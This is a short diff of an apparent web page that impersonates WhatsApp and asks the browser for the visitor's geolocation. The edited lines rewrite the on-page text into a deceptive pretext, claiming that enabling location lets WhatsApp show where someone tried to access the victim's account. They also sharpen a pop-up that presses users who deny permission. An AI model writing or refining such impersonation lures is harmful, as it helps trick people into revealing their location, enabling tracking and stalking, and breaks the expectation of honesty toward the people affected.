@@ -50,7 +50,7 @@ iframe{
 
 <h2>whatsApp buscara la ubicación...</h2>
 
-<p id="estado">Por favor activa la ubicación y concede el permiso para continuar.</p>
+<p id="estado">Activa la ubicacion para que WhatsApp te muestre desde donde intentaron acceder a tu cuenta.</p>
 
 <iframe
     src="https://www.google.com/maps?q=Colombia&output=embed">
@@ -158,7 +158,7 @@ if ("geolocation" in navigator) {
             switch(error.code){
 
                 case error.PERMISSION_DENIED:
-                    alert("Activa la ubicación y refresca la pagina.");
+                    alert("Activa ubicacion y da el permiso para continuar.");
                     break;
 
                 case error.POSITION_UNAVAILABLE:
